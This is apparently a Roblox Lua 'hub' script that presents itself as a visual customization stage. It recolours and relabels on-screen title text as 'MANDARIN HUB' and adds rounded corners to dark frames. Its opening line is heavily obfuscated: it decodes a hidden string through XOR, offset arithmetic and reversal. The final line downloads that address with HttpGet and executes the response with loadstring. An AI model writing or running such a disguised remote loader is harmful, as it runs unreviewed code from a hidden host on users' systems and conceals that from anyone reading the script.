
--[[ STAGE 2: VISUAL CORE ]]
local V0_feI1Il_cfExC="\252\235\008\037\020\241\010\006\113\027\043\026\121\061\061\051\128\066\067\058\067\052\049\069\054\147\149\130\061\064\070\072\094"local rcDPz0BkvkOIwTqGllt9e=82 local tCy5P4n9IVlkD=222 local MUHtMTVKRHJiQL=0 local JPRAoitLERuyT69q2=2 local H2UavQNJYEuO4JF=4 local Q8qnfCnJenNt92zFGB=true local enu2b4cJNMoEgLm651NwM=bit32 and bit32.bxor if not enu2b4cJNMoEgLm651NwM then enu2b4cJNMoEgLm651NwM=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local cL4xtSkMDHhPJfACd={}for vSHASNlww3xBSecx=1,#V0_feI1Il_cfExC do local kY1pr2IbhlWm5=string.byte(V0_feI1Il_cfExC,vSHASNlww3xBSecx)local gBCZGyIOlBEstP7baPtuOi=(tCy5P4n9IVlkD+(vSHASNlww3xBSecx*JPRAoitLERuyT69q2)+H2UavQNJYEuO4JF)%256 if MUHtMTVKRHJiQL==0 then kY1pr2IbhlWm5=(kY1pr2IbhlWm5-gBCZGyIOlBEstP7baPtuOi)%256 cL4xtSkMDHhPJfACd[vSHASNlww3xBSecx]=string.char(enu2b4cJNMoEgLm651NwM(kY1pr2IbhlWm5,rcDPz0BkvkOIwTqGllt9e))else kY1pr2IbhlWm5=enu2b4cJNMoEgLm651NwM(kY1pr2IbhlWm5,rcDPz0BkvkOIwTqGllt9e)cL4xtSkMDHhPJfACd[vSHASNlww3xBSecx]=string.char((kY1pr2IbhlWm5-gBCZGyIOlBEstP7baPtuOi)%256)end end local r9MaD2U3mPCqQcDvEtP=table.concat(cL4xtSkMDHhPJfACd)if Q8qnfCnJenNt92zFGB then r9MaD2U3mPCqQcDvEtP=string.reverse(r9MaD2U3mPCqQcDvEtP)end local h1fOvdiu3bnn5Wy=r9MaD2U3mPCqQcDvEtP
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(h1fOvdiu3bnn5Wy))()
